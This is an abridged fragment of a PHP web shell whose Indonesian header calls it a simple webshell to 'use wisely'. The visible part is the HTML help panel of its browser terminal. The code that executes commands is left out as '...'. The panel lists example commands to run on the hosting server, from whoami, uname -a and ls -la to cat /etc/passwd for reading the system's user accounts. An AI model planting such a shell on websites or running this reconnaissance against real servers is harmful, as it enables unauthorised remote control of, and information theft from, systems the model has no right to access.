<?php
// SIMPLE PHP WEBSHELL - HARAP DIGUNAKAN DENGAN BIJAK
...
<body>
    ...
    <div class="terminal">
        ...
        <div style="margin-top: 20px; color: #888;">
            <h4>Contoh Perintah:</h4>
            <ul>
                <li><code>whoami</code> - Cek user</li>
                <li><code>pwd</code> atau <code>cd</code> - Current directory</li>
                <li><code>ls -la</code> atau <code>dir</code> - List files</li>
                <li><code>php -v</code> - Cek PHP version</li>
                <li><code>uname -a</code> - System info</li>
                <li><code>cat /etc/passwd</code> - Lihat users (Linux)</li>
            </ul>
        </div>
    </div>
